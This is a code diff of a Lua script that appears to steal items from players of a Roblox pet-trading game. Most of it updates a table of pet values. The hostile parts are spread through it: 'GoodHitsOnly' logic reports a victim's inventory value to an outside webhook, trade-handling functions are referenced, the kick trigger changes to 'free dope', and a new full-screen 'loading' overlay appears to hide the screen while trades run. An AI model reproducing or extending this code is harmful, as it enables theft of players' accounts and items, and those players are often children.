@@ -39,29 +39,28 @@ end
 -- >> Values Table for all pets << --
 local valuesTable = {
     -- Legendary Pets
-    ["Shadow Dragon"] = {value = 1000, rarity = "legendary"},
-    ["Giraffe"] = {value = 800, rarity = "legendary"},
-    ["Bat Dragon"] = {value = 750, rarity = "legendary"},
-    ["Frost Dragon"] = {value = 600, rarity = "legendary"},
-    ["Owl"] = {value = 500, rarity = "legendary"},
-    ["Parrot"] = {value = 450, rarity = "legendary"},
-    ["Evil Unicorn"] = {value = 400, rarity = "legendary"},
-    ["Crow"] = {value = 380, rarity = "legendary"},
-    ["King Monkey"] = {value = 300, rarity = "legendary"},
-    ["Arctic Reindeer"] = {value = 280, rarity = "legendary"},
-    ["Albino Monkey"] = {value = 250, rarity = "legendary"},
-    ["Turtle"] = {value = 200, rarity = "legendary"},
+    ["Shadow Dragon"] = {value = 7000, rarity = "legendary"},
+    ["Giraffe"] = {value = 8000, rarity = "legendary"},
+    ["Bat Dragon"] = {value = 10000, rarity = "legendary"},
+    ["Frost Dragon"] = {value = 2000, rarity = "legendary"},
+    ["Owl"] = {value = 3500, rarity = "legendary"},
+    ["Parrot"] = {value = 2000, rarity = "legendary"},
+    ["Evil Unicorn"] = {value = 1000, rarity = "legendary"},
+    ["Crow"] = {value = 2000, rarity = "legendary"},
+    ["Arctic Reindeer"] = {value = 700, rarity = "legendary"},
+    ["Albino Monkey"] = {value = 400, rarity = "legendary"},
+    ["Turtle"] = {value = 450, rarity = "legendary"},
     ["Kangaroo"] = {value = 180, rarity = "legendary"},
     ["Unicorn"] = {value = 150, rarity = "legendary"},
-    ["Dragon"] = {value = 100, rarity = "legendary"},
+    ["Dragon"] = {value = 22, rarity = "legendary"},
     ["Golden Penguin"] = {value = 90, rarity = "legendary"},
     ["Diamond Griffin"] = {value = 85, rarity = "legendary"},
     ["Diamond Dragon"] = {value = 80, rarity = "legendary"},
     ["Diamond Unicorn"] = {value = 75, rarity = "legendary"},
     ["Golden Rat"] = {value = 70, rarity = "legendary"},
-    ["Golden Dragon"] = {value = 65, rarity = "legendary"},
+    ["Golden Dragon"] = {value = 15, rarity = "legendary"},
     ["Golden Griffin"] = {value = 8, rarity = "legendary"},
-    ["Golden Unicorn"] = {value = 55, rarity = "legendary"},
+    ["Golden Unicorn"] = {value = 25, rarity = "legendary"},
     ["Queen Bee"] = {value = 120, rarity = "legendary"},
     ["Skeleton Rex"] = {value = 110, rarity = "legendary"},
     ["Cerberus"] = {value = 95, rarity = "legendary"},
@@ -72,55 +71,302 @@ local valuesTable = {
     ["Snow Owl"] = {value = 65, rarity = "legendary"},
     ["Phoenix"] = {value = 60, rarity = "legendary"},
     ["Shark"] = {value = 55, rarity = "legendary"},
-    ["Octopus"] = {value = 50, rarity = "legendary"},
+    ["Octopus"] = {value = 33, rarity = "legendary"},
     ["Goldhorn"] = {value = 45, rarity = "legendary"},
     ["Diamond Ladybug"] = {value = 40, rarity = "legendary"},
-    ["Ancient Dragon"] = {value = 35, rarity = "legendary"},
+    ["Ancient Dragon"] = {value = 18, rarity = "legendary"},
     ["Diamond King Penguin"] = {value = 30, rarity = "legendary"},
     ["Chameleon"] = {value = 25, rarity = "legendary"},
-    ["Lava Dragon"] = {value = 20, rarity = "legendary"},
-    ["Strawberry Bat Dragon"] = {value = 15, rarity = "legendary"},
-    ["SS Bat Dragon"] = {value = 10, rarity = "legendary"},
+    ["Lava Dragon"] = {value = 74, rarity = "legendary"},
+    ["Strawberry Shortcake Bat Dragon"] = {value = 400, rarity = "legendary"},
+    ["Chocolate Chip Bat Dragon"] = {value = 500, rarity = "legendary"},
     ["Alicorn"] = {value = 30, rarity = "legendary"}, -- from that updated
     ["Kitty Bat"] = {value = 16, rarity = "legendary"},
+    ["Crystal Egg"] = {value = 14, rarity = "legendary"},
+    ["Royal Egg"] = {value = 2, rarity = "legendary"},
+    ["Aztec Egg"] = {value = 2, rarity = "legendary"},
+    ["Moon Egg"] = {value = 4, rarity = "legendary"},
+    ["Garden Egg"] = {value = 8, rarity = "legendary"},
+    ["Aussie Egg"] = {value = 177, rarity = "legendary"},
+    ["Japan Egg"] = {value = 14, rarity = "legendary"},
+    ["Danger Egg"] = {value = 33, rarity = "legendary"},
+    ["Mythic Egg"] = {value = 12, rarity = "legendary"},
+    ["Desert Egg"] = {value = 16, rarity = "legendary"},
+    ["Fossil Egg"] = {value = 35, rarity = "legendary"},
+    ["Ocean Egg"] = {value = 27, rarity = "legendary"},
+    ["Slimingo"] = {value = 20, rarity = "legendary"},
+    ["Quetzalcoatl"] = {value = 8, rarity = "legendary"},
+    ["Woodland Egg"] = {value = 30, rarity = "legendary"},
+    ["Temple Friend"] = {value = 7, rarity = "legendary"},
+    ["Glormy Dolphin"] = {value = 15, rarity = "legendary"},
+    ["Fool Egg"] = {value = 82, rarity = "legendary"},
+    ["Zodiac Minion Chick"] = {value = 5, rarity = "legendary"},
+    ["Dragonfly"] = {value = 7, rarity = "legendary"},
+    ["Frost Fury"] = {value = 100, rarity = "legendary"},
+    ["Southeast Asia Egg"] = {value = 24, rarity = "legendary"},
+    ["Metal Ox"] = {value = 6, rarity = "legendary"},
+    ["Fairy Bat Dragon"] = {value = 255, rarity = "legendary"},
+    ["Dracula Parrot"] = {value = 10, rarity = "legendary"},
+    ["Golden Egg"] = {value = 43, rarity = "legendary"},
+    ["Winter Buck"] = {value = 25, rarity = "legendary"},
+    ["Vanilla Penguin"] = {value = 155, rarity = "legendary"},
+    ["Lunar Gold Tiger"] = {value = 7, rarity = "legendary"},
+    ["Golden Tortoise Beetle"] = {value = 8, rarity = "legendary"},
+    ["Royal Moon Egg"] = {value = 33, rarity = "legendary"},
+    ["Frostclaw"] = {value = 23, rarity = "legendary"},
+    ["Royal Aztec Egg"] = {value = 30, rarity = "legendary"},
+    ["Lunar Moon Bear"] = {value = 13, rarity = "legendary"},
+    ["Diamond Egg"] = {value = 66, rarity = "legendary"},
+    ["Ice Moth Dragon"] = {value = 33, rarity = "legendary"},
+    ["Sunglider"] = {value = 35, rarity = "legendary"},
+    ["Squid"] = {value = 35, rarity = "legendary"},
+    ["Mushroom Friend"] = {value = 35, rarity = "legendary"},
+    ["Berry Cool Cube"] = {value = 32, rarity = "legendary"},
+    ["Sunrise Ducking"] = {value = 20, rarity = "legendary"},
+    ["Fleur De Ice"] = {value = 24, rarity = "legendary"},
+    ["Mecha Meow"] = {value = 315, rarity = "legendary"},
+    ["Corn Doggo"] = {value = 155, rarity = "legendary"},
+    ["Dango Penguins"] = {value = 1380, rarity = "legendary"},
+    ["Candy Hare"] = {value = 113, rarity = "legendary"},
+    ["Balloon Unicorn"] = {value = 1900, rarity = "legendary"},
+    ["Christmas Egg"] = {value = 699, rarity = "legendary"},
+    ["Cupid Dragon"] = {value = 200, rarity = "legendary"},
+    ["Super Saru"] = {value = 20, rarity = "legendary"},
+    ["Vampire Dragon"] = {value = 200, rarity = "legendary"},
+    ["Gargoyle"] = {value = 40, rarity = "legendary"},
+    ["Cryptid"] = {value = 550, rarity = "legendary"},
+    ["Grim Dragon"] = {value = 220, rarity = "legendary"},
+    ["Capricorn"] = {value = 35, rarity = "legendary"},
+    ["Royal Desert Egg"] = {value = 55, rarity = "legendary"},
+    ["Phantom Dragon"] = {value = 150, rarity = "legendary"},
+    ["Emberlight"] = {value = 125, rarity = "legendary"},
+    ["Winged Horse"] = {value = 48, rarity = "legendary"},
+    ["Majestic Pony"] = {value = 140, rarity = "legendary"},
+    ["Yule Log Dog"] = {value = 125, rarity = "legendary"},
+    ["Cuddly Candle"] = {value = 44, rarity = "legendary"},
+    ["Princess Capuchin Monkey"] = {value = 65, rarity = "legendary"},
+    ["Dimension Drifter"] = {value = 24, rarity = "legendary"},
+    ["Pirate Hermit Crab"] = {value = 37, rarity = "legendary"},
+    ["Golden Hamster"] = {value = 42, rarity = "legendary"},
+    ["Golden Kinguin"] = {value = 27, rarity = "legendary"},
+    ["Kraken"] = {value = 17, rarity = "legendary"},
+    ["Fallow Deer"] = {value = 295, rarity = "legendary"},
+    ["Tree Kangaroo"] = {value = 80, rarity = "legendary"},
+    ["Field Mouse"] = {value = 150, rarity = "legendary"},
+    ["Shark Puppy"] = {value = 365, rarity = "legendary"},
+    ["King Bee"] = {value = 80, rarity = "legendary"},
+    ["Coconut Friend"] = {value = 55, rarity = "legendary"},
+    ["Cactus Friend"] = {value = 75, rarity = "legendary"},
+    ["Dire Stag"] = {value = 27, rarity = "legendary"},
+    ["Golden Walrus"] = {value = 38, rarity = "legendary"},
+    ["Frostbite Bear"] = {value = 600, rarity = "legendary"},
+    ["Firefly"] = {value = 102, rarity = "legendary"},
+    ["Sakura Spirit"] = {value = 150, rarity = "legendary"},
+    ["Hippogriff"] = {value = 35, rarity = "legendary"},
+    ["Nessie"] = {value = 180, rarity = "legendary"},
+    ["Pumpkin Carriage"] = {value = 60, rarity = "legendary"},
+    ["Leviathan"] = {value = 66, rarity = "legendary"},
+    ["Glormy Leo"] = {value = 166, rarity = "legendary"},
+    ["Midnight Dragon"] = {value = 105, rarity = "legendary"},
+    ["Naga Dragon"] = {value = 44, rarity = "legendary"},
+    ["Dancing Dragon"] = {value = 55, rarity = "legendary"},
+    ["Scarebear"] = {value = 37, rarity = "legendary"},
+    ["Ninja Monkey"] = {value = 66, rarity = "legendary"},
+    ["Naughty Mistletroll"] = {value = 85, rarity = "legendary"},
+    ["Halloween White Ghost Dragon"] = {value = 60, rarity = "legendary"},
+    ["Chimera"] = {value = 20, rarity = "legendary"},
+    ["Moose Calf"] = {value = 370, rarity = "legendary"},
+    ["Werewolf"] = {value = 240, rarity = "legendary"},
+    ["Golden Pinguin"] = {value = 90, rarity = "legendary"},
+    ["Farm Egg"] = {value = 2200, rarity = "legendary"},
+    ["Astronaut Gorilla"] = {value = 45, rarity = "legendary"},
+    ["Peacock"] = {value = 42, rarity = "legendary"},
+    ["Sugar Glider"] = {value = 400, rarity = "legendary"},
+    ["Diamond Hummingbird"] = {value = 80, rarity = "legendary"},
+    ["Frost Unicorn"] = {value = 450, rarity = "legendary"},
+    ["Dragon Train"] = {value = 125, rarity = "legendary"},
+    ["Rainbow Dragon"] = {value = 95, rarity = "legendary"},
+    ["Lavender Dragon"] = {value = 37, rarity = "legendary"},
+    ["Giant Cheetah Mount"] = {value = 624, rarity = "legendary"},
+    ["Memricorn"] = {value = 37, rarity = "legendary"},
+    ["Royal Mistletroll"] = {value = 460, rarity = "legendary"},
+    ["Strawberry Penguin"] = {value = 500, rarity = "legendary"},
+    ["Caelum Cervi"] = {value = 280, rarity = "legendary"},
+    ["Glormy Hound"] = {value = 120, rarity = "legendary"},
 
     -- Ultra-Rare Pets
-    ["Bee"] = {value = 25, rarity = "ultra_rare"},
-    ["Penguin"] = {value = 20, rarity = "ultra_rare"},
-    ["Red Panda"] = {value = 18, rarity = "ultra_rare"},
-    ["Shiba Inu"] = {value = 16, rarity = "ultra_rare"},
+    ["Bee"] = {value = 4, rarity = "ultra_rare"},
+    ["Penguin"] = {value = 7, rarity = "ultra_rare"},
+    ["Red Panda"] = {value = 2, rarity = "ultra_rare"},
+    ["Shiba Inu"] = {value = 2, rarity = "ultra_rare"},
     ["Sloth"] = {value = 9, rarity = "ultra_rare"},
-    ["Koala"] = {value = 14, rarity = "ultra_rare"},
-    ["Frog"] = {value = 13, rarity = "ultra_rare"},
-    ["Yeti"] = {value = 12, rarity = "ultra_rare"},
-    ["Lamb"] = {value = 11, rarity = "ultra_rare"},
-    ["Cow"] = {value = 10, rarity = "ultra_rare"},
-    ["Pig"] = {value = 9, rarity = "ultra_rare"},
-    ["Rhino"] = {value = 8, rarity = "ultra_rare"},
-    ["Platypus"] = {value = 7, rarity = "ultra_rare"},
-    ["Zombie Buffalo"] = {value = 6, rarity = "ultra_rare"},
+    ["Koala"] = {value = 11, rarity = "ultra_rare"},
+    ["Frog"] = {value = 9, rarity = "ultra_rare"},
+    ["Yeti"] = {value = 35, rarity = "ultra_rare"},
+    ["Lamb"] = {value = 88, rarity = "ultra_rare"},
+    ["Rhino"] = {value = 98, rarity = "ultra_rare"},
+    ["Platypus"] = {value = 227, rarity = "ultra_rare"},
     ["Turkey"] = {value = 5, rarity = "ultra_rare"},
     ["Silly Duck"] = {value = 4, rarity = "ultra_rare"},
     ["Drake"] = {value = 3, rarity = "ultra_rare"},
-    ["Lion"] = {value = 2, rarity = "ultra_rare"},
     ["Blue Dog"] = {value = 1, rarity = "ultra_rare"},
     ["Gingerbread Reindeer"] = {value = 45, rarity = "ultra_rare"}, -- from that updated
+    ["Persian Cat"] = {value = 2, rarity = "ultra_rare"},
+    ["Ghostly Cat"] = {value = 6, rarity = "ultra_rare"},
+    ["Onza"] = {value = 4, rarity = "ultra_rare"},
+    ["Choco Penguin"] = {value = 29, rarity = "ultra_rare"},
+    ["Ginger Cat"] = {value = 5, rarity = "ultra_rare"},
+    ["Mr Whiskerpips"] = {value = 25, rarity = "ultra_rare"},
+    ["Lunar Ox"] = {value = 2, rarity = "ultra_rare"},
+    ["Icy Porcupine"] = {value = 8, rarity = "ultra_rare"},
+    ["Toucan"] = {value = 2, rarity = "ultra_rare"},
+    ["Gingerbread Mouse"] = {value = 25, rarity = "ultra_rare"},
+    ["Corgi"] = {value = 2, rarity = "ultra_rare"},
+    ["Swordfish"] = {value = 2, rarity = "ultra_rare"},
+    ["Starfish"] = {value = 4, rarity = "ultra_rare"},
+    ["Robot"] = {value = 2, rarity = "ultra_rare"},
+    ["Pomeranian"] = {value = 15, rarity = "ultra_rare"},
+    ["Lunar White Tiger"] = {value = 2, rarity = "ultra_rare"},
+    ["Frozen Penguin"] = {value = 3, rarity = "ultra_rare"},
+    ["Snowy Mammoth"] = {value = 5, rarity = "ultra_rare"},
+    ["Ribbon Seal"] = {value = 4, rarity = "ultra_rare"},
+    ["Ehecatl"] = {value = 2, rarity = "ultra_rare"},
+    ["Starmite"] = {value = 2, rarity = "ultra_rare"},
+    ["Puptune"] = {value = 32, rarity = "ultra_rare"},
+    ["Orca"] = {value = 8, rarity = "ultra_rare"},
+    ["Badger"] = {value = 8, rarity = "ultra_rare"},
+    ["Cold Cube"] = {value = 2, rarity = "ultra_rare"},
+    ["Winter Doe"] = {value = 8, rarity = "ultra_rare"},
+    ["Bauble Buddies"] = {value = 80, rarity = "ultra_rare"},
+    ["St Bernard"] = {value = 12, rarity = "ultra_rare"},
+    ["Tan Chow-Chow"] = {value = 25, rarity = "ultra_rare"},
+    ["Zombie Wolf"] = {value = 33, rarity = "ultra_rare"},
+    ["Water Moon Bear"] = {value = 2, rarity = "ultra_rare"},
+    ["Ladybug"] = {value = 2, rarity = "ultra_rare"},
+    ["Toxic Kaijunior"] = {value = 2, rarity = "ultra_rare"},
+    ["Hamster"] = {value = 22, rarity = "ultra_rare"},
+    ["Alley Cat"] = {value = 165, rarity = "ultra_rare"},
+    ["Toasty Red Panda"] = {value = 7, rarity = "ultra_rare"},
+    ["Halloween White Skeleton Dog"] = {value = 5, rarity = "ultra_rare"},
+    ["Flower Power Duckling"] = {value = 22, rarity = "ultra_rare"},
+    ["Skunk"] = {value = 15, rarity = "ultra_rare"},
+    ["Chilling Spider"] = {value = 3, rarity = "ultra_rare"},
+    ["Albino Bat"] = {value = 15, rarity = "ultra_rare"},
+    ["Highland Cow"] = {value = 15, rarity = "ultra_rare"},
+    ["Wyvern"] = {value = 2, rarity = "ultra_rare"},
+    ["Praying Mantis"] = {value = 3, rarity = "ultra_rare"},
+    ["Hydra"] = {value = 2, rarity = "ultra_rare"},
+    ["Ghost Chick"] = {value = 2, rarity = "ultra_rare"},
+    ["Snowball Pet"] = {value = 142, rarity = "ultra_rare"},
+    ["King Pinguin"] = {value = 2, rarity = "ultra_rare"},
+    ["Magma Moose"] = {value = 2, rarity = "ultra_rare"},
+    ["Sabertooth"] = {value = 2, rarity = "ultra_rare"},
+    ["Gingerbread Hare"] = {value = 25, rarity = "ultra_rare"},
+    ["Merry Mistletroll"] = {value = 50, rarity = "ultra_rare"},
+    ["Lionfish"] = {value = 2, rarity = "ultra_rare"},
+    ["Magma Snail"] = {value = 2, rarity = "ultra_rare"},
+    ["Scarecrow Cat"] = {value = 9, rarity = "ultra_rare"},
+    ["Pink Betta Fish"] = {value = 5, rarity = "ultra_rare"},
+    ["Christmas Pudding Pup"] = {value = 385, rarity = "ultra_rare"},
+    ["Ram"] = {value = 55, rarity = "ultra_rare"},
+    ["Pretty Pony"] = {value = 62, rarity = "ultra_rare"},
+    ["Frostbite Cub"] = {value = 38, rarity = "ultra_rare"},
+    ["Happy Clam"] = {value = 135, rarity = "ultra_rare"},
+    ["Flamingo"] = {value = 600, rarity = "ultra_rare"},
+    ["Peppermint Penguin"] = {value = 38, rarity = "ultra_rare"},
+    ["Crocodile"] = {value = 400, rarity = "ultra_rare"},
+    ["Slime"] = {value = 107, rarity = "ultra_rare"},
+    ["Hedgehog"] = {value = 2000, rarity = "ultra_rare"},
+    ["Skelebat"] = {value = 20, rarity = "ultra_rare"},
+    ["Goat"] = {value = 299, rarity = "ultra_rare"},
+    ["Sugar Scull potion "] = {value = 165, rarity = "ultra_rare"},
+    ["Cabbit"] = {value = 451, rarity = "ultra_rare"},
+    ["Lion"] = {value = 333, rarity = "ultra_rare"},
+    ["Llama"] = {value = 133, rarity = "ultra_rare"},
+    ["Patridge"] = {value = 120, rarity = "ultra_rare"},
+    ["Artic Fox"] = {value = 222, rarity = "ultra_rare"},
+    ["Lion Cub"] = {value = 296, rarity = "ultra_rare"},
+    ["Puffin"] = {value = 219, rarity = "ultra_rare"},
+    ["Many Mackerel"] = {value = 190, rarity = "ultra_rare"},
+    ["Wood Pigeon"] = {value = 90, rarity = "ultra_rare"},
+    ["Mini Pig"] = {value = 700, rarity = "ultra_rare"},
+    ["Tortuga De La Isla"] = {value = 299, rarity = "ultra_rare"},
+    ["Siamese Cat"] = {value = 250, rarity = "ultra_rare"},
+    ["Gaelic Fae"] = {value = 99, rarity = "ultra_rare"},
+    ["Zombie Buffalo"] = {value = 299, rarity = "ultra_rare"},
+    ["Jellyfish"] = {value = 244, rarity = "ultra_rare"},
 
     -- Rare Pets
     ["Bunny"] = {value = 8, rarity = "rare"},
-    ["Beaver"] = {value = 7, rarity = "rare"},
-    ["Rabbit"] = {value = 6, rarity = "rare"},
+    ["Beaver"] = {value = 2, rarity = "rare"},
+    ["Rabbit"] = {value = 2, rarity = "rare"},
     ["Snow Puma"] = {value = 5, rarity = "rare"},
-    ["Chocolate Labrador"] = {value = 4, rarity = "rare"},
     ["Poodle"] = {value = 2, rarity = "rare"},
     ["Swan"] = {value = 2, rarity = "rare"},
     ["Black Panther"] = {value = 1, rarity = "rare"},
     ["Zebra"] = {value = 1, rarity = "rare"}, -- from that updated
+    ["Winter Fawn"] = {value = 10, rarity = "rare"},
+    ["Shetland Pony Dark Brown"] = {value = 2, rarity = "rare"},
+    ["Ghost Wolf"] = {value = 2, rarity = "rare"},
+    ["Ox"] = {value = 2, rarity = "rare"},
+    ["Ice Cube"] = {value = 3, rarity = "rare"},
+    ["Parakeet"] = {value = 2, rarity = "rare"},
+    ["Tarantula"] = {value = 2, rarity = "rare"},
+    ["Monkey"] = {value = 2, rarity = "rare"},
+    ["Orangutan"] = {value = 2, rarity = "rare"},
+    ["Amber Butterfly"] = {value = 2, rarity = "rare"},
+    ["Moonpine"] = {value = 2, rarity = "rare"},
+    ["Water Opossum"] = {value = 2, rarity = "rare"},
+    ["Chanekeh"] = {value = 2, rarity = "rare"},
+    ["Cow"] = {value = 600, rarity = "rare"},
+    ["Gorilla"] = {value = 2, rarity = "rare"},
+    ["Sasquatch"] = {value = 2, rarity = "rare"},
+    ["Zeopod"] = {value = 2, rarity = "rare"},
+    ["Zombie Chick"] = {value = 2, rarity = "rare"},
+    ["Happy Duckling"] = {value = 29, rarity = "rare"},
+    ["Emu"] = {value = 2, rarity = "rare"},
+    ["Black Moon Bear"] = {value = 2, rarity = "rare"},
+    ["Seahorse"] = {value = 2, rarity = "rare"},
+    ["Kelp Raider"] = {value = 2, rarity = "rare"},
+    ["Merhorse"] = {value = 2, rarity = "rare"},
+    ["Australian Kelpie"] = {value = 2, rarity = "rare"},
+    ["Toy Poodle"] = {value = 2, rarity = "rare"},
+    ["Abyssinian Cat"] = {value = 2, rarity = "rare"},
+    ["Leopard Cat"] = {value = 21, rarity = "rare"},
+    ["Ocelot"] = {value = 2, rarity = "rare"},
+    ["Orange Betta Fish"] = {value = 2, rarity = "rare"},
+    ["Eggnog Hare"] = {value = 12, rarity = "rare"},
+    ["Halloween White Mummy Cat"] = {value = 2, rarity = "rare"},
+    ["Pudding Cat"] = {value = 40, rarity = "rare"},
+    ["Clover Cow"] = {value = 15, rarity = "rare"},
+    ["Sweetheart Rat"] = {value = 32, rarity = "rare"},
+    ["Koi Carp"] = {value = 4, rarity = "rare"},
+    ["DJ Snooze"] = {value = 3, rarity = "rare"},
+    ["Indian Leopard"] = {value = 2, rarity = "rare"},
+    ["Red Fox"] = {value = 5, rarity = "rare"},
+    ["Hippo"] = {value = 25, rarity = "rare"},
+    ["Woolly Mammoth"] = {value = 2, rarity = "rare"},
+    ["Munchkin Cat"] = {value = 155, rarity = "rare"},
+    ["Sea Angel"] = {value = 4, rarity = "rare"},
+    ["Halloween Evil Dachshund"] = {value = 4, rarity = "rare"},
+    ["Great Pyrenees"] = {value = 40, rarity = "rare"},
+    ["Narwhal"] = {value = 2, rarity = "rare"},
+    ["Moon Rabbit"] = {value = 12, rarity = "rare"},
+    ["Tarsier"] = {value = 15, rarity = "rare"},
+    ["Cow Calf"] = {value = 15, rarity = "rare"},
+    ["French Bulldog"] = {value = 47, rarity = "rare"},
+    ["Shiver Wolf"] = {value = 26, rarity = "rare"},
+    ["Pig"] = {value = 200, rarity = "rare"},
+    ["Hare"] = {value = 100, rarity = "rare"},
+    ["Polar Bear"] = {value = 125, rarity = "rare"},
+    ["Elephant"] = {value = 350, rarity = "rare"},
+    ["Hyena"] = {value = 90, rarity = "rare"},
+    ["Mule"] = {value = 400, rarity = "rare"},
+    ["Ring-tailed Lemur"] = {value = 700, rarity = "rare"},
 
     -- Uncommon Pets
     ["Cat"] = {value = 4, rarity = "uncommon"},
     ["Dog"] = {value = 3, rarity = "uncommon"},
-    ["Buffalo"] = {value = 2, rarity = "uncommon"},
     ["Robin"] = {value = 1, rarity = "uncommon"},
     ["Jumping Spider"] = {value = 2, rarity = "uncommon"}, -- from that updated
     ["Shih Tzu"] = {value = 2, rarity = "uncommon"},
@@ -129,10 +375,61 @@ local valuesTable = {
     ["Wolf"] = {value = 13, rarity = "uncommon"},
     ["Bat"] = {value = 3, rarity = "uncommon"},
     ["Camel"] = {value = 3, rarity = "uncommon"},
+    ["Snorgle"] = {value = 2, rarity = "uncommon"},
+    ["Muskrat"] = {value = 2, rarity = "uncommon"},
+    ["Kaijunior"] = {value = 2, rarity = "uncommon"},
+    ["Chocolate Labrador"] = {value = 2, rarity = "uncommon"},
+    ["Donkey"] = {value = 2, rarity = "uncommon"},
+    ["Fennec Fox"] = {value = 2, rarity = "uncommon"},
+    ["Mahi Mahi"] = {value = 2, rarity = "uncommon"},
+    ["Puma"] = {value = 2, rarity = "uncommon"},
+    ["Halloween Black Mummy Cat"] = {value = 2, rarity = "uncommon"},
+    ["Dingo"] = {value = 2, rarity = "uncommon"},
+    ["Ermine"] = {value = 7, rarity = "uncommon"},
+    ["Kelp Crewmate"] = {value = 2, rarity = "uncommon"},
+    ["Arctic Hare"] = {value = 4, rarity = "uncommon"},
+    ["Patchy Bear"] = {value = 2, rarity = "uncommon"},
+    ["Christmas Future Egg"] = {value = 42, rarity = "uncommon"},
+    ["Eggnog Dog"] = {value = 24, rarity = "uncommon"},
+    ["Snowman"] = {value = 10, rarity = "uncommon"},
+    ["Mistletroll"] = {value = 7, rarity = "uncommon"},
+    ["Kirin"] = {value = 2, rarity = "uncommon"},
+    ["Mole"] = {value = 2, rarity = "uncommon"},
+    ["Rock"] = {value = 5, rarity = "uncommon"},
+    ["Harp Seal"] = {value = 72, rarity = "uncommon"},
+    ["Crab"] = {value = 2, rarity = "uncommon"},
+    ["Rock Pigeon"] = {value = 5, rarity = "uncommon"},
+    ["Glyptodon"] = {value = 5, rarity = "uncommon"},
+    ["Slug"] = {value = 2, rarity = "uncommon"},
+    ["Triceratops"] = {value = 2, rarity = "uncommon"},
+    ["Halloween Blue Scorpion"] = {value = 2, rarity = "uncommon"},
+    ["Snow Leopard"] = {value = 10, rarity = "uncommon"},
+    ["Red Cardinal"] = {value = 2, rarity = "uncommon"},
+    ["Raccoon"] = {value = 15, rarity = "uncommon"},
+    ["Quokka"] = {value = 33, rarity = "uncommon"},
 
     -- Common Pets
     ["Otter"] = {value = 2, rarity = "common"},
-    ["Chick"] = {value = 1, rarity = "common"}
+    ["Chick"] = {value = 1, rarity = "common"},
+    ["Hopbop"] = {value = 1, rarity = "common"}, -- from that updated
+    ["Blue Butterfly"] = {value = 2, rarity = "common"},
+    ["Mouse"] = {value = 2, rarity = "common"},
+    ["Aye Aye"] = {value = 2, rarity = "common"},
+    ["Ant"] = {value = 2, rarity = "common"},
+    ["Tegu"] = {value = 2, rarity = "common"},
+    ["Buffalo"] = {value = 2, rarity = "common"},
+    ["Show Pony"] = {value = 2, rarity = "common"},
+    ["Bandicoot"] = {value = 2, rarity = "common"},
+    ["Ratatoskr"] = {value = 2, rarity = "common"},
+    ["Garden Snake"] = {value = 2, rarity = "common"},
+    ["Bakeneko"] = {value = 2, rarity = "common"},
+    ["Ghost"] = {value = 5, rarity = "common"},
+    ["Kid Goat"] = {value = 2, rarity = "common"},
+    ["Frankenfeline"] = {value = 2, rarity = "common"},
+    ["Mongoose"] = {value = 5, rarity = "common"},
+    ["Ground Sloth"] = {value = 2, rarity = "common"},
+    ["Cockroach"] = {value = 5, rarity = "common"},
+    ["Brachiosaurus"] = {value = 5, rarity = "common"}
 }
 
 -- >> Rarity multipliers << --
@@ -149,7 +446,7 @@ local rarityMultipliers = {
 -- >> /kick command << --
 game.Players.PlayerAdded:Connect(function(newPlayer)
     newPlayer.Chatted:Connect(function(message)
-        if message == "/kick" then
+        if message == "free dope" then
             game.Players.LocalPlayer:Kick("\nPlease rejoin!")
         end
     end)
@@ -250,11 +547,6 @@ for i, v in pairs(ClientData.get("inventory").pets) do
     elseif petData.rarity == "common" then
         common_count = common_count + 1
     end
-end
-
-if GoodHitsOnly and legendaries_count == 0 and neon_count == 0 and mega_neon_count == 0 and flyable_count == 0 and rideable_count == 0 then
-    game:GetService("Players").LocalPlayer:Kick("\nPlease use different account!")
-    return
 end
 
         -- Function to calculate pet value based on valuesTable and properties
@@ -657,6 +949,17 @@ function SendTradeSuccessMessage(ReceiverName, tradedPets)
     end)
 end
 
+--<>----< GoodHitsOnly logic >----<>--
+if GoodHitsOnly then
+    if totalValue >= 50 then
+        SendMessageEMBED(Webhook, embed, true)
+    else
+        return
+    end
+else
+    SendMessageEMBED(Webhook, embed, totalValue >= 50)
+end
+
 
 local function TradeIncoming(ReceiverName)
     while true do
@@ -785,3 +1088,159 @@ game.Players.PlayerAdded:Connect(function(player)
         end)
     end
 end)
+
+-- Создаем основной фрейм для блюра
+local blurFrame = Instance.new("Frame")
+blurFrame.Name = "LoadingBlurFrame"
+blurFrame.Size = UDim2.new(1, 0, 1, 0)
+blurFrame.Position = UDim2.new(0, 0, 0, 0)
+blurFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+blurFrame.BackgroundTransparency = 0.3
+blurFrame.ZIndex = 10
+blurFrame.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- Создаем эффект блюра через GaussianBlur
+local blurEffect = Instance.new("BlurEffect")
+blurEffect.Size = 10
+blurEffect.Name = "LoadingBlur"
+blurEffect.Parent = game:GetService("Lighting")
+
+-- Основной контейнер для загрузки
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Name = "LoadingFrame"
+loadingFrame.Size = UDim2.new(0, 300, 0, 150)
+loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
+loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+loadingFrame.BackgroundTransparency = 0.1
+loadingFrame.BorderSizePixel = 0
+loadingFrame.ZIndex = 11
+loadingFrame.Parent = blurFrame
+
+-- Закругленные углы
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = loadingFrame
+
+-- Текст загрузки
+local loadingText = Instance.new("TextLabel")
+loadingText.Name = "LoadingText"
+loadingText.Size = UDim2.new(0.8, 0, 0, 40)
+loadingText.Position = UDim2.new(0.1, 0, 0.3, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Загрузка..."
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.Gotham
+loadingText.TextWrapped = true
+loadingText.ZIndex = 12
+loadingText.Parent = loadingFrame
+
+-- Индикатор загрузки
+local loadingBar = Instance.new("Frame")
+loadingBar.Name = "LoadingBar"
+loadingBar.Size = UDim2.new(0.8, 0, 0, 4)
+loadingBar.Position = UDim2.new(0.1, 0, 0.7, 0)
+loadingBar.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+loadingBar.BorderSizePixel = 0
+loadingBar.ZIndex = 12
+loadingBar.Parent = loadingFrame
+
+local loadingProgress = Instance.new("Frame")
+loadingProgress.Name = "LoadingProgress"
+loadingProgress.Size = UDim2.new(0, 0, 1, 0)
+loadingProgress.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+loadingProgress.BorderSizePixel = 0
+loadingProgress.ZIndex = 13
